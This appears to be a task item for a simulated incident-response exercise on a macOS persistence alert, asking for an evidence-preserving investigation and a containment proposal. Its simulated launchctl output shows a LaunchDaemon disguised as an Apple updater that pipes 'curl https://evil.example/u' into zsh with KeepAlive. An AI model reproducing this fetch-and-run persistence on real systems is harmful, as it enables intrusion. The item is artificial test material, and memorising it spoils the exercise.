name: macOS persistence investigation
prompt: Investigate the simulated macOS persistence alert in evidence-preserving order. Establish time, inspect the launch daemon, query unified logs, hash the plist, and propose containment in answer.json.

lab.context: EDR detected curl launched by an unexpected system LaunchDaemon.

commands.launchctl print system/com.apple.updates:
path = /Library/LaunchDaemons/com.apple.updates.plist
program = /bin/zsh
arguments = curl -fsSL https://evil.example/u | zsh
KeepAlive = true
